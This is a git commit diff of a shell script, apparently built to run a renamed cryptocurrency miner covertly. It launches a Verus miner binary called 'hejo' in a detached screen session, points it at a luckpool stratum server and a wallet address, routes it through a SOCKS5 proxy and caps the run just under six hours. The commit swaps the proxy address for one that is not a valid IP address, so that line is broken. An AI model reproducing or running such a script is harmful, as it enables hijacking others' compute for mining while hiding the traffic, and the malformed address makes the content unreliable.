e3db84904f9426de1ad638ea4df62dac2056908e
chiarasss <87688804+chiarasss@users.noreply.github.com>
2021-09-04 08:37:03 +0700

    Update cuk.sh

--- cuk.sh
+++ cuk.sh
@@ -6,6 +6,6 @@ screen -dmS ls
 A=stratum+tcp://na.luckpool.net:3956
 B=R9WfkuyN7thLWMiL98b2NrHfL1qRYzqcdY
 C=TESSSS
-D=socks5://78.47.163.81:1080
+D=socks5://7134.209.240.44:1080
 timeout 359m ./hejo -a verus -o $A -u $B.$C -p x -t 2 -x $D
 sudo apt update
